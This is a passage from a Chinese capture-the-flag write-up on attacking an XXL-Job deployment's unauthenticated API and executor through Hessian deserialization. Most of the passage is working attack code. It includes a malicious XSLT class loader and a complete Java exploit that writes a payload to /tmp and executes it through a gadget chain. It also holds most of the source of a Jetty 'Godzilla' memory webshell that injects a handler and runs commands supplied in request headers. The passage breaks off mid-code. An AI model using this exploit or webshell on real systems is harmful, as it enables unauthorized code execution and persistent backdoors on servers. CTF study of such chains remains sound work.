/usr/local/tomcat/logs/catalina.out</span><br></code></pre></td></tr></table></figure></blockquote><p>现在再打一遍</p><p><img src="https://cdn.clown2024.cn/image-20241127221633717.png" alt="image-20241127221633717"></p><p>可以看到我们成功打进去了，证明exp是没问题的，现在就该考虑打什么内存马了</p><blockquote><p>然后这里打着打着突然发现了奇怪的问题，我现在打的是api的未授权，而且又是在tomcat起的服务，怎么wp打的是jetty内存马呢</p><p>后来看了一下题目只给了executor的端口，而该版本的executor也是存在未授权打hessian反序列化的，具体的可以看一下文章，所以我打半天打错端口了😡，那也先复现打一下api吧，等会再打题目的executor未授权</p></blockquote><p>这里用一款java内存马生成工具：<a href="https://github.com/pen4uin/java-memshell-generator-release">https://github.com/pen4uin/java-memshell-generator-release</a></p><p><img src="https://cdn.clown2024.cn/image-20241128173522354.png" alt="image-20241128173522354"></p><p>生成对应的冰蝎内存马</p><p>然后xslt文件改成这样</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;org.junit.m.EncryptionUtils&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>这里defineClass的类名记得写成注入器的类名，一开始忘改了卡这里好久服了😭</p></blockquote><p>最后写一个一把梭的exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-comment">//发送post请求，因为Hessian要发送原生的序列化数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postExp</span><span class="hljs-params">(String url1,<span class="hljs-type">byte</span>[] poc)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//创建url对象</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url1);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// 设置请求方法为 POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// 设置请求头</span><br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// 允许输出</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//设置请求体</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// 获取响应码</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// 关闭连接</span><br>        connection.disconnect();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadXslt</span><span class="hljs-params">(String url, String xsltFilePath)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9可以换成MimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//去修改这里写入的文件名，以及文件内容</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//先将第一个字节复制为67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//然后将data复制到后面</span><br>        postExp(url,poc);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAttack</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9可以换成MimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//解析xslt文件生效</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>&#125;&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//先将第一个字节复制为67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//然后将data复制到后面</span><br>        postExp(url,poc);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;http://127.0.0.1:8080/api&quot;</span>;<br>        uploadXslt(url, <span class="hljs-string">&quot;payload.xslt&quot;</span>);<br>        doAttack(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128173705623.png" alt="image-20241128173705623"></p><p>然后冰蝎上线</p><p><img src="https://cdn.clown2024.cn/image-20241128173725650.png" alt="image-20241128173725650"></p><p><img src="https://cdn.clown2024.cn/image-20241128173740656.png" alt="image-20241128173740656"></p><h2 id="executor未授权"><a href="#executor未授权" class="headerlink" title="executor未授权"></a>executor未授权</h2><p>属实是干无语了给我，打了半天发现题目是打的executor未授权，题目好像是只给了一个executor的端口，我本地搭的所以admin和executor端口都有，然后api未授权也是能正常打，直接打偏了</p><p>executor我们访问9999端口他的回显是这样的</p><p><img src="https://cdn.clown2024.cn/image-20241128162332049.png" alt="image-20241128162332049"></p><p>这里也是用的hessian反序列化读取数据，这里我们可以去xxl-job的executor的源码看到jetty服务的启动源码</p><p><img src="https://cdn.clown2024.cn/image-20241128163747857.png" alt="image-20241128163747857"></p><p>这里只设置了一个JettyServerHandler，所有请求都会由这个JettyServerHandler来处理，看一下源码</p><p><img src="https://cdn.clown2024.cn/image-20241128163951810.png" alt="image-20241128163951810"></p><p>可以看到他这里也是进行Hessian反序列化处理，和我们前面admin看到的处理方式是一样的</p><p>那我们就需要去注入一个handler，也就是jetty的内存马，直接抄wp的了，一开始用内存马生成器生成了打不进去</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xxl.job.core;<br><br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.*;<br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.handler.AbstractHandler;<br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.handler.HandlerCollection;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.ref.Reference;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-comment">//author:Boogipop</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JettyGodzillaMemshell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandler</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;3c6e0b8a9c15224a&quot;</span>; <span class="hljs-comment">// key</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">pass</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;username&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">md5</span> <span class="hljs-operator">=</span> md5(pass + xc);<br>    Class payload;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">md5</span><span class="hljs-params">(String s)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            java.security.MessageDigest m;<br>            m = java.security.MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>            m.update(s.getBytes(), <span class="hljs-number">0</span>, s.length());<br>            ret = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.math.BigInteger(<span class="hljs-number">1</span>, m.digest()).toString(<span class="hljs-number">16</span>).toUpperCase();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JettyGodzillaMemshell</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JettyGodzillaMemshell</span><span class="hljs-params">(<span class="hljs-type">int</span> s)</span> &#123;<br>        System.out.println(<span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">HttpConnection</span> <span class="hljs-variable">valueField</span> <span class="hljs-operator">=</span> getValueField();<br>            <span class="hljs-type">HandlerCollection</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (HandlerCollection) valueField.getHttpChannel().getServer().getHandler();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">mutableWhenRunning</span> <span class="hljs-operator">=</span> handler.getClass().getDeclaredField(<span class="hljs-string">&quot;_mutableWhenRunning&quot;</span>);<br>            mutableWhenRunning.setAccessible(<span class="hljs-literal">true</span>);<br>            mutableWhenRunning.set(handler,<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//            handler.addHandler(new JettyHandlerMemshell(1));</span><br>            Handler[] handlers = handler.getHandlers();<br>            Handler[] newHandlers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>[handlers.length+<span class="hljs-number">1</span>];<br>            newHandlers[<span class="hljs-number">0</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">JettyGodzillaMemshell</span>(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; handlers.length; i++) &#123;<br>                newHandlers[i + <span class="hljs-number">1</span>] = handlers[i];<br>            &#125;<br>            handler.setHandlers(newHandlers);<br><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> sun.misc.Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unsafe.setAccessible(<span class="hljs-literal">true</span>);<br>        sun.misc.<span class="hljs-type">Unsafe</span> <span class="hljs-variable">theunsafe</span> <span class="hljs-operator">=</span> (sun.misc.Unsafe) unsafe.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> theunsafe;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HttpConnection <span class="hljs-title function_">getValueField</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, ClassNotFoundException, IllegalAccessException &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br>        <span class="hljs-type">ThreadGroup</span> <span class="hljs-variable">threadGroup</span> <span class="hljs-operator">=</span> Thread.currentThread().getThreadGroup();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">threadsfiled</span> <span class="hljs-operator">=</span> threadGroup.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);<br>        Thread[] threads = (Thread[]) unsafe.getObject(threadGroup, unsafe.objectFieldOffset(threadsfiled));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;threads.length;i++) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Field</span> <span class="hljs-variable">threadLocalsF</span> <span class="hljs-operator">=</span> threads[i].getClass().getDeclaredField(<span class="hljs-string">&quot;threadLocals&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">threadlocal</span> <span class="hljs-operator">=</span> unsafe.getObject(threads[i], unsafe.objectFieldOffset(threadLocalsF));<br>                Reference[] table = (Reference[]) unsafe.getObject(threadlocal, unsafe.objectFieldOffset(threadlocal.getClass().getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>)));<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;table.length;j++)&#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//HttpConnection value = (HttpConnection) unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(&quot;value&quot;)));</span><br>                        <span class="hljs-comment">//PrintWriter writer = value.getHttpChannel().getResponse().getWriter();</span><br>                        <span class="hljs-comment">//writer.println(Runtime.getRuntime().exec(value.getHttpChannel().getRequest().getParameter(&quot;cmd&quot;)));</span><br>                        <span class="hljs-comment">//writer.flush();</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span>unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(<span class="hljs-string">&quot;value&quot;</span>)));<br>                        <span class="hljs-keyword">if</span>(value.getClass().getName().equals(<span class="hljs-string">&quot;org.eclipse.jetty.server.HttpConnection&quot;</span>))&#123;<br>                            <span class="hljs-keyword">return</span> (HttpConnection)value;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> (Exception e)&#123;<br><br>                    &#125;<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64Encode</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class base64;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            base64 = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getEncoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);<br>            value = (String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encodeToString&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                base64 = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Encoder&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.newInstance();<br>                value = (String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] base64Decode(String bs) <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class base64;<br>        <span class="hljs-type">byte</span>[] value = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            base64 = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);<br>            value = (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                base64 = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.newInstance();<br>                value = (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] x(<span class="hljs-type">byte</span>[] s, <span class="hljs-type">boolean</span> m) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>            c.init(m ? <span class="hljs-number">1</span> : <span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(xc.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>));<br>            <span class="hljs-keyword">return</span> c.doFinal(s);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(String s, Request base, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">&quot;x-fuck-data&quot;</span>).equalsIgnoreCase(<span class="hljs-string">&quot;cmd&quot;</span>)) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;<br>                    String[] cmds = <span class="hljs-literal">null</span>;<br>                    <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br> 